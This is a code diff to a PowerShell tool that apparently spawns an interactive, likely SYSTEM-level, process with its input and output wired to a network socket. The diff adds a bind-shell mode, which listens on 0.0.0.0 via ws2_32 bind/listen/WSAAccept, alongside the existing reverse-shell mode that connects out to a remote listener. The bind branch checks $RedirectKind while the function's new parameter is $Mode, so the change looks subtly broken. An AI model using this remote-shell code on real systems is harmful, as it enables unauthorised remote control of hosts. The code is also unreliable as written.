@@ -253,6 +253,30 @@ $InvokeInteractiveProcess_ScriptBlock = {
 
             [DllImport("ws2_32.dll", SetLastError = true)]
             [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int bind(
+                IntPtr s,
+                IntPtr name,
+                int namelen
+            );
+
+            [DllImport("ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
+            public static extern int listen(
+                IntPtr s,
+                int backlog
+            );
+
+            [DllImport("ws2_32.dll", SetLastError = true)]
+            public static extern IntPtr WSAAccept(
+                IntPtr s,
+                IntPtr addr,
+                IntPtr addrlen,
+                IntPtr lpfnCondition,
+                IntPtr dwCallbackData
+            );
+
+            [DllImport("ws2_32.dll", SetLastError = true)]
+            [return: MarshalAs(UnmanagedType.I4)]
             public static extern int closesocket(IntPtr s);
         }
 "@
@@ -365,11 +389,16 @@ $InvokeInteractiveProcess_ScriptBlock = {
 
             [Parameter(Mandatory=$True)]
             [ValidateRange(1, 65535)]
-            [int] $Port
+            [int] $Port,
+
+            [Parameter(Mandatory=$True)]
+            [ValidateSet("Reverse", "Bind")]
+            [string] $Mode
         )
 
+        $SOCKET_ERROR = -1
         $sockAddrPtr = [IntPtr]::Zero
-        $socket = -1
+        $socket = $SOCKET_ERROR
         try
         {
             $socket = New-NativeSocket
@@ -388,25 +417,64 @@ $InvokeInteractiveProcess_ScriptBlock = {
                 [System.Runtime.InteropServices.Marshal]::WriteByte($sockAddrPtr, $i, $sockAddr[$i])
             }
 
-            $result = [WS232]::WSAConnect(
-                $socket,
-                $sockAddrPtr,
-                $sockAddr.Size,
-                [IntPtr]::Zero,
-                [IntPtr]::Zero,
-                [IntPtr]::Zero,
-                [IntPtr]::Zero
-            )
-            if ($result -eq -1)
+            Switch ($RedirectKind)
             {
-                throw [WinAPIException]::New("WSAConnect")
+                # Reverse Shell: Remote listener must be started before executing this command.
+                "Reverse" {
+                    $result = [WS232]::WSAConnect(
+                        $socket,
+                        $sockAddrPtr,
+                        $sockAddr.Size,
+                        [IntPtr]::Zero,
+                        [IntPtr]::Zero,
+                        [IntPtr]::Zero,
+                        [IntPtr]::Zero
+                    )
+                    if ($result -eq $SOCKET_ERROR)
+                    {
+                        throw [WinAPIException]::New("WSAConnect")
+                    }
+                }
+
+                # Bind Shell: This will start a listener and wait for a single connection to occur. Notice that
+                # this method will block the execution until a connection is established.
+                "Bind" {
+                    $result = [WS232]::bind(
+                        $socket,
+                        $sockAddrPtr,
+                        $sockAddr.Size
+                    )
+
+                    if ($result -eq $SOCKET_ERROR)
+                    {
+                        throw [WinAPIException]::New("bind")
+                    }
+
+                    $result = [WS232]::listen(
+                        $socket,
+                        1  # Maximum number of pending connections (We only need one)
+                    )
+
+                    if ($result -eq $SOCKET_ERROR)
+                    {
+                        throw [WinAPIException]::New("listen")
+                    }
+
+                    $socket = [WS232]::WSAAccept(
+                        $socket,
+                        [IntPtr]::Zero,
+                        [IntPtr]::Zero,
+                        [IntPtr]::Zero,
+                        [IntPtr]::Zero
+                    )
+                }
             }
         }
         catch
         {
             Close-NativeSocket -Socket $socket
 
-            $socket = -1
+            $socket = $SOCKET_ERROR
         }
         finally
         {
@@ -425,10 +493,10 @@ $InvokeInteractiveProcess_ScriptBlock = {
             [string] $CommandLine = "powershell.exe",
             [switch] $Hide,
 
-            [ValidateSet("None", "Reverse")]
+            [ValidateSet("None", "Reverse", "Bind")]
             [string] $RedirectKind = "None",
 
-            [string] $Address = "127.0.0.1",
+            [string] $Address = "",
 
             [ValidateRange(1, 65535)]
             [int] $Port = 2801
@@ -440,11 +508,26 @@ $InvokeInteractiveProcess_ScriptBlock = {
         }
 
         $redirectFd = $false
-        if ($RedirectKind -eq "Reverse")
+        if ($RedirectKind -ne "None")
         {
+            # Initialize Default Address (Depending on the context)
+            if ($Address -eq "")
+            {
+                Switch ($RedirectKind)
+                {
+                    "Reverse" {
+                        $Address = "127.0.0.1"
+                    }
+
+                    "Bind" {
+                        $Address = "0.0.0.0"
+                    }
+                }
+            }
+
             Initialize-NativeSocket
 
-            $socket = Connect-NativeSocket -Address $Address -Port $Port
+            $socket = Connect-NativeSocket -Address $Address -Port $Port -Mode $RedirectKind
 
             $redirectFd = $true
         }
@@ -932,7 +1015,7 @@ function Invoke-InteractiveSystemProcess
         [string] $CommandLine = "powershell.exe",
         [switch] $Hide,
 
-        [ValidateSet("None", "Reverse")]
+        [ValidateSet("None", "Reverse", "Bind")]
         [string] $RedirectKind = "None",
 
         # Depending on the RedirectKind, the following parameter is whether the address of remote server
